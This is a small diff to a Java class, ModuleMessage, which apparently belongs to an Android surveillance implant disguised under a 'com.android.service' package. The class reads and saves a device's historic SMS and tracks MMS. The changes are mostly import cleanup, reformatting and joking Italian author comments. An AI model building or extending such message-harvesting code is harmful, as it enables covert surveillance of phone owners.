@@ -29,11 +29,10 @@ import com.android.service.listener.ListenerSms;
 import com.android.service.module.message.Filter;
 import com.android.service.module.message.Mms;
 import com.android.service.module.message.MmsBrowser;
-import com.android.service.module.message.MmsHandler;
+
 import com.android.service.module.message.MsgHandler;
 import com.android.service.module.message.Sms;
 import com.android.service.module.message.SmsBrowser;
-import com.android.service.module.message.SmsHandler;
 
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -45,7 +44,8 @@ import com.android.service.util.WChar;
  * The Class MessageAgent.
  * 
  * @author zeno -> Ahahah ti piacerebbe eh?? :>
- * @real-author Que, r0x
+ * @real-author Que, r0x -> vantatene pure.
+ * @bug-sterminator zeno
  */
 public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private static final String TAG = "ModuleMessage"; //$NON-NLS-1$
@@ -230,11 +230,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		lastSMS = readHistoricSms(lastSMS);
 
 		updateMarkupSMS(lastSMS);
-		
-		/*if (!storedSMS.isMarkup()) {
-			int lastSMS = readHistoricSms();
-			storedSMS.createEmptyMarkup();			
-		}*/
+
+		/*
+		 * if (!storedSMS.isMarkup()) { int lastSMS = readHistoricSms();
+		 * storedSMS.createEmptyMarkup(); }
+		 */
 	}
 
 	private void initMms() {
@@ -265,7 +265,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			}
 		}
 	}
-	
+
 	public synchronized void updateMarkupSMS(int value) {
 		try {
 			lastSMS = value;
@@ -314,7 +314,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				saveSms(s);
 			}
 		}
-		
+
 		return smsBrowser.getMaxId();
 	}
 
@@ -396,6 +396,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	public synchronized int getLastManagedMmsId() {
 		return lastMMS;
 	}
+
 	public synchronized int getLastManagedSmsId() {
 		return lastSMS;
 	}
